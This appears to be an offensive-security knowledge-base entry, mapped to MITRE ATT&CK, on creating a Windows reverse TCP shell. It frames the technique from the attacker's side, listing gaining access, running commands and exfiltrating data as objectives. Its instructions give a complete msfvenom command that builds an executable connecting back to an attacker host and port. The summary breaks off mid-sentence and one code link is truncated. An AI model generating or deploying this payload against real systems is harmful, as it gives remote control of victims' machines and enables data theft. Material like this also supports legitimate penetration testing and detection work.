---
id: 8fe90cb2-b9e6-4112-8158-a29173770496
name: Windows Meterpreter Shell using Reverse TCP
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.847432+00:00'
updated_at: '2023-04-10T20:25:25.567863+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
- '[[Commonly Used Port|T1043 - Commonly Used Port]]'
- '[[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]'
tags:
- '[[Meterpreter Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
- '[[Windows Stageless reverse TCP]]'
commands:
- '[[Create reverse shell payload for Windows]]'
---

# Windows Meterpreter Shell using Reverse TCP

## Summary

The Windows Meterpreter Shell using Reverse TCP is a powerful tool for attackers to gain access to a victim's machine. This technique involves generating a payload that can be delivered to the target machine, which when executed, establishes a reverse connection to the attacker's machine. Once the 

## Description

# Description

The Windows Meterpreter Shell using Reverse TCP is a powerful tool for attackers to gain access to a victim's machine. This technique involves generating a payload that can be delivered to the target machine, which when executed, establishes a reverse connection to the attacker's machine. Once the connection is established, the attacker can execute commands on the victim's machine and exfiltrate data.

From a technical standpoint, this technique involves using the Windows Reverse Shell Payload Generator to create a payload that can be delivered to the target machine. Once the payload is executed, it establishes a reverse connection to the attacker's machine, which can then be used to execute commands and exfiltrate data.

The business value of this technique is that it allows attackers to gain access to sensitive data and systems, which can then be used for financial gain or to cause harm to the victim organization.

## Requirements

1. Access to the victim's machine

1. Ability to generate a payload using the Windows Reverse Shell Payload Generator

## Defense

1. Use network segmentation to prevent attackers from gaining access to sensitive systems

1. Implement strong access controls to prevent unauthorized access to systems

1. Monitor network traffic for signs of malicious activity

## Objectives

1. Gain access to the victim's machine

1. Execute commands on the victim's machine

1. Exfiltrate data from the victim's machine

# Instructions

1. This command generates a Windows reverse shell payload using msfvenom. The payload is designed to connect back to the specified IP address and port number.

**Code**: [[msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0]]

> The 'msfvenom' tool is used to generate custom payloads for the Metasploit Framework. The '-p' option specifies the payload to be used, in this case 'windows/shell_reverse_tcp' which creates a reverse TCP shell. The 'LHOST' and 'LPORT' options specify the IP address and port number that the payload will connect back to. The '-f' option specifies the format of the output file, which in this case is an executable file. The '>' operator redirects the output to a file named 'reverse.exe'.

**Command** ([[Create reverse shell payload for Windows]]):

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Defense Evasion|TA0005 - Defense Evasion]]

### Techniques

- [[Commonly Used Port|T1043 - Commonly Used Port]]
- [[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]

## Commands Used

- [[Create reverse shell payload for Windows]]

## Tags

- [[Meterpreter Shell]]
- [[Reverse Shell Cheat Sheet]]
- [[Windows Stageless reverse TCP]]
